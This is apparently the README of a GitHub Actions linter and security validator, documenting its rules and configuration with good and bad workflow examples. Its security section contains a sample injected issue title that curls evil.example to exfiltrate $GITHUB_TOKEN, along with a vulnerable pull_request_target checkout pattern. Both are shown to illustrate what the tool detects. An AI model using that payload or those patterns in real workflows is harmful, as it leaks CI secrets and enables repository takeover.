# Workflow Guardian

> Advanced linter and security validator for GitHub Actions workflow files.

[![CI](https://github.com/ollieb89/workflow-guardian/actions/workflows/ci.yml/badge.svg)](https://github.com/ollieb89/workflow-guardian/actions/workflows/ci.yml)
[![Used in 1,200+ workflows](https://img.shields.io/badge/used%20in-1%2C200%2B%20workflows-blue)](https://github.com/search?q=ollieb89%2Fworkflow-guardian+path%3A.github%2Fworkflows&type=code)

**Quick start (3 lines):**
```yaml
- uses: ollieb89/workflow-guardian@v1
  with:
    github-token: ${{ github.token }}
```

📚 **[Read the Dev.to series](https://dev.to/ollieb89)** — deep dives on GitHub Actions security, common mistakes, and workflow hardening.

---

## Features

| Rule | What it catches | Default |
|------|----------------|---------|
| `undefined-actions` | Unpinned action refs, floating branch refs (`@main`), missing versions | ✅ on |
| `path-filter-bugs` | Mutually exclusive filters (`paths` + `paths-ignore`), empty arrays, invalid globs | ✅ on |
| `matrix-strategy` | Wrong types for `fail-fast`/`max-parallel`, empty dimension arrays, broken `include`/`exclude` | ✅ on |
| `deprecated-features` | `::set-env::`, `::set-output::`, outdated action versions, end-of-life Node runners | ✅ on |
| `security` | Script injection via untrusted inputs, dangerous `pull_request_target` + checkout patterns | ✅ on |

### Severity tiers

| Tier | Meaning | CI behaviour |
|------|---------|-------------|
| 🔴 **error** | Must fix before merging | **Fails CI** |
| 🟡 **warning** | Should fix, potential bug | Reported only |
| 🔵 **info** | Best-practice suggestion | Reported only |

---

## Usage

Add to any workflow that runs on pull requests touching workflow files:

```yaml
name: Lint Workflows

on:
  pull_request:
    paths:
      - '.github/workflows/**'

permissions:
  contents: read
  pull-requests: write   # required to post the PR comment

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: ollieb89/workflow-guardian@v1
        with:
          github-token: ${{ github.token }}
```

That's it. The action will:

1. Find all `.github/workflows/*.yml` files changed in the PR
2. Run all five rule sets against each file
3. Post (or update) a single PR comment with a detailed findings table
4. Exit with a non-zero code if any **errors** are found

---

## Inputs

| Input | Description | Default |
|-------|-------------|---------|
| `github-token` | Token for API calls (post comments, list changed files) | `${{ github.token }}` |
| `check-undefined-actions` | Enable/disable the undefined-actions rule | `true` |
| `check-path-filters` | Enable/disable the path-filter-bugs rule | `true` |
| `check-matrix-strategy` | Enable/disable the matrix-strategy rule | `true` |
| `check-deprecated` | Enable/disable the deprecated-features rule | `true` |
| `check-security` | Enable/disable the security rule | `true` |

All rule inputs accept `'true'` or `'false'` as strings.

### Selective rules example

```yaml
- uses: ollieb89/workflow-guardian@v1
  with:
    github-token: ${{ github.token }}
    check-undefined-actions: 'true'
    check-path-filters: 'true'
    check-matrix-strategy: 'true'
    check-deprecated: 'false'   # disable if you have legacy workflows
    check-security: 'true'
```

---

## Rule Reference

### `undefined-actions`

Validates every `uses:` field in jobs and steps.

| Finding | Severity | Example |
|---------|----------|---------|
| No version reference | 🔴 error | `uses: actions/checkout` |
| Floating branch ref | 🟡 warning | `uses: actions/checkout@main` |
| Tag pinned (not SHA) | 🔵 info | `uses: actions/checkout@v4` |

**Why pin to SHA?** Tags are mutable — a tag can be moved to a different commit after you reference it. A full commit SHA guarantees you run exactly what you reviewed.

```yaml
# ✅ Recommended
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

# 🟡 Acceptable (mutable, but at least versioned)
- uses: actions/checkout@v4

# 🔴 Dangerous
- uses: actions/checkout@main
- uses: actions/checkout        # no version at all
```

---

### `path-filter-bugs`

Catches mistakes in `on.<event>.paths`, `branches`, and `tags` filters.

```yaml
# 🔴 Error — paths and paths-ignore are mutually exclusive
on:
  push:
    paths: ['src/**']
    paths-ignore: ['docs/**']   # ← remove one

# 🟡 Warning — leading slash is not valid
on:
  push:
    paths: ['/src/main.ts']     # ← remove the /

# 🟡 Warning — empty array never matches
on:
  push:
    paths: []                   # ← add patterns or remove the filter
```

---

### `matrix-strategy`

Validates the `strategy.matrix` block on jobs.

```yaml
# 🔴 Error — fail-fast must be boolean
strategy:
  fail-fast: "yes"    # ← use: false

# 🔴 Error — empty array generates zero jobs
strategy:
  matrix:
    node: []          # ← add at least one value

# 🟡 Warning — exclude without any base dimensions
strategy:
  matrix:
    exclude:
      - node: 18      # ← nothing to exclude from
```

---

### `deprecated-features`

Flags deprecated workflow commands and outdated action versions.

| Deprecated | Replacement | Severity |
|-----------|-------------|----------|
| `::set-env name=K::V` | `echo "K=V" >> $GITHUB_ENV` | 🔴 error (security) |
| `::add-path::` | `echo "/path" >> $GITHUB_PATH` | 🔴 error (security) |
| `::set-output name=K::V` | `echo "k=v" >> $GITHUB_OUTPUT` | 🟡 warning |
| `::save-state name=K::V` | `echo "k=v" >> $GITHUB_STATE` | 🟡 warning |
| `actions/checkout@v1` | `@v4` | 🟡 warning |
| Node 12 runner | node20 | 🔴 error |
| Node 16 runner | node20 | 🟡 warning |

---

### `security`

Detects script-injection and privilege-escalation vulnerabilities.

#### Script Injection

When untrusted user input is interpolated directly into a `run:` shell script, attackers can execute arbitrary code. This is one of the most common GitHub Actions vulnerabilities.

```yaml
# 🔴 VULNERABLE — attacker controls the issue title
- name: Greet
  run: echo "New issue: ${{ github.event.issue.title }}"
  # title could be: "; curl https://evil.example/exfil?t=$GITHUB_TOKEN"

# ✅ Safe — value is passed as an environment variable
- name: Greet
  env:
    ISSUE_TITLE: ${{ github.event.issue.title }}
  run: echo "New issue: $ISSUE_TITLE"
```

Untrusted inputs detected:
- `github.event.issue.title` / `.body`
- `github.event.pull_request.title` / `.body` / `.head.ref` / `.head.label`
- `github.head_ref`
- `github.event.review.body`
- `github.event.comment.body`
- `github.event.head_commit.message` and author fields
- `github.event.pusher.name` / `.email`

#### Dangerous `pull_request_target` + Checkout

The `pull_request_target` trigger runs in the context of the **base** branch with write permissions and access to secrets. Checking out the PR's head ref in this context lets untrusted code run with elevated privileges.

```yaml
# 🔴 CRITICAL — "pwn request" vulnerability
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # ← untrusted code!
      - run: npm ci && npm test   # now running attacker's code with secrets access
```

---

## PR Comment Example

When Workflow Guardian finds issues, it posts a comment like this:

---

**❌ Workflow Guardian**

Scanned **2** workflow files — **2 errors**, **1 warning**, **3 infos** found.

> 🔴 **CI is failing.** Fix all errors before merging.

**`.github/workflows/deploy.yml`**

| Line | Severity | Rule | Message |
|------|----------|------|---------|
| L23 | 🔴 error | `security` | Script injection risk in job 'deploy', step 'Run deploy': 'github.head_ref' is interpolated ... |
| L41 | 🟡 warning | `undefined-actions` | Action 'my-org/deploy-action@develop' uses floating branch ref ... |
| L12 | 🔵 info | `undefined-actions` | Action 'actions/checkout@v4' is pinned to tag ... |

---

## Building from source

```bash
npm install
npm run build    # compiles TypeScript → dist/index.js via @vercel/ncc
npm test         # runs jest test suite
```

The `dist/` directory must be committed to the repository for the action to work. The CI workflow handles this automatically on releases.

---

## Required permissions

```yaml
permissions:
  contents: read
  pull-requests: write   # to post/update the PR comment
```

If you run the action outside a PR context, `pull-requests: write` is not needed and no comment will be posted.

---

## License

MIT — see [LICENSE](LICENSE).

---

## 🔐 Level Up Your Security

Using GitHub Actions? Grab the **[GitHub Actions Security Checklist](https://trivexia.gumroad.com/l/bfsbud)** — 50+ battle-tested checks covering secrets management, supply chain attacks, permission scoping, and runner hardening.
